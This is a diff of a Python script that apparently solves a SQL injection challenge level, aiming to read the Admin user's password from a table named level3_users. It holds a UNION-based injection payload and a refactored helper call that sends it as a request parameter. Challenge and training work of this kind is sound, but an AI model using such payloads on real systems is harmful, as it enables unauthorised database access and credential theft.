@@ -26,7 +26,9 @@ def encrypt_python(cryptstr: str):
                 78, 208, 215, 74, 86, 35, 255, 71, 39, 24, 23, 14,
                 187, 231, 45, 255, 184, 42, 65, 178, 246, 2, 19,
                 162, 37, 18, 185, 85, 252, 175, 125, 74, 128, 84,
-                149, 214, 120, 149, 29, 160, 174, 52, 175, 105, 28]
+                149, 214, 120, 149, 29, 160, 174, 52, 175, 105, 28,
+                220, 105, 212, 7, 170, 135, 254, 172, 154, 160, 209,
+                172, 90, 39, 169, 9, 165, 243, 137, 250]
 
     for i in range(len(cryptstr)):
         srd = rand_num[i]
@@ -56,7 +58,7 @@ def encrypt_php(cryptstr: str):
 
 def main():
     '''
-    url-encoding with simple sql injection
+    Url-encoding with simple sql injection
 
     Target: Get the password of the user Admin.
     Hint: Try to get an error. Tablename: level3_users
@@ -96,7 +98,8 @@ def main():
 
     # Search for visible columns and desired data
     payload = f"' union select %s from {base_name} where username='Admin'#"
-    if not (keys := tg.find_visible_columns(url, columns, payload, 'usr', finds, cook, fun)):
+    data = dict(usr=payload)
+    if not (keys := tg.find_visible_columns_and_param(url, columns, data, finds, cook, fun)):
         return False
 
     # Authorization
